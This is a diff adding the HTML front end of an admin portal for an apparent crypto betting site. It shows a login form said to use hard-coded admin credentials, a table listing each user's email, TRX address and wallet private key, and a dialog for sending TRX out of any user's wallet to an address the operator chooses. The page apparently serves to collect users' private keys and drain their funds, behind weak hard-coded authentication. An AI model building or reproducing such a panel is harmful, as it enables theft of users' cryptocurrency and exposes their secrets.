@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Portal</title>
+  <link rel="icon" type="image/png" href="./flopibet-tab.png" />
+  <link rel="apple-touch-icon" href="./flopibet-tab.png" />
+  <link rel="stylesheet" href="./styles.css" />
+</head>
+<body>
+  <section class="auth-gate" id="authGate">
+    <div class="auth-card">
+      <p class="eyebrow">Admin Access</p>
+      <h1>Sign in to continue</h1>
+      <p class="lede">Use the hard-coded admin username and password to unlock the portal.</p>
+      <form id="loginForm" class="auth-form">
+        <label class="field">
+          <span>Username</span>
+          <input id="loginUsername" type="text" autocomplete="username" placeholder="Admin username" />
+        </label>
+        <label class="field">
+          <span>Password</span>
+          <input id="loginPassword" type="password" autocomplete="current-password" placeholder="Admin password" />
+        </label>
+        <p class="auth-error" id="loginError"></p>
+        <button class="primary-btn auth-submit" type="submit">Login</button>
+      </form>
+    </div>
+  </section>
+
+  <main class="shell hidden" id="dashboardApp">
+    <section class="hero">
+      <div>
+        <p class="eyebrow">Admin Portal</p>
+        <h1>User sync dashboard</h1>
+        <p class="lede">
+          Mirrors only the fields you asked for: email, private key, TRX address, and referral count.
+          The page validates your token, shows destination data immediately, and refreshes after background sync completes.
+        </p>
+      </div>
+
+      <div class="status-card">
+        <span class="status-label">Sync status</span>
+        <strong id="syncStatus">Waiting to sync...</strong>
+        <span id="syncMeta">Connecting to backend</span>
+        <button id="syncBtn" type="button">Sync now</button>
+        <button id="logoutBtn" type="button" class="logout-btn">Logout</button>
+      </div>
+    </section>
+
+    <section class="metrics">
+      <article>
+        <span>Users mirrored</span>
+        <strong id="userCount">0</strong>
+      </article>
+      <article>
+        <span>Last run</span>
+        <strong id="lastRun">Never</strong>
+      </article>
+      <article>
+        <span>Inserted</span>
+        <strong id="insertedCount">0</strong>
+      </article>
+      <article>
+        <span>Updated</span>
+        <strong id="updatedCount">0</strong>
+      </article>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head">
+        <h2>Mirrored users</h2>
+        <span id="collectionLabel">users</span>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Email</th>
+              <th>TRX Address</th>
+              <th>Private Key</th>
+              <th>Referrals</th>
+              <th>Live TRX</th>
+              <th>Live USD</th>
+              <th>Action</th>
+              <th>Synced At</th>
+            </tr>
+          </thead>
+          <tbody id="usersTable">
+            <tr>
+              <td colspan="8" class="empty">No users loaded yet.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+  </main>
+
+  <div class="modal-backdrop hidden" id="transferModal">
+    <div class="modal">
+      <div class="modal-head">
+        <div>
+          <p class="eyebrow">Transfer TRX</p>
+          <h2 id="modalTitle">Send from user</h2>
+        </div>
+        <button class="icon-btn" type="button" id="transferCancel" aria-label="Close transfer dialog">×</button>
+      </div>
+
+      <div class="modal-meta">
+        <span id="modalEmail"></span>
+        <span id="modalFrom"></span>
+      </div>
+
+      <label class="field">
+        <span>Destination TRX address</span>
+        <input id="transferTo" type="text" placeholder="T..." autocomplete="off" />
+      </label>
+
+      <label class="field">
+        <span>Amount TRX</span>
+        <input id="transferAmount" type="number" min="0" step="0.000001" placeholder="0.00" />
+      </label>
+
+      <p class="modal-status" id="transferMessage"></p>
+
+      <div class="modal-actions">
+        <button class="ghost-btn" type="button" id="transferCancelBottom">Cancel</button>
+        <button class="primary-btn" type="button" id="transferSend">Send TRX</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    window.ADMIN_API_BASE = "https://web-production-b4e4e.up.railway.app";
+  </script>
+  <script src="./app.js"></script>
+</body>
+</html>
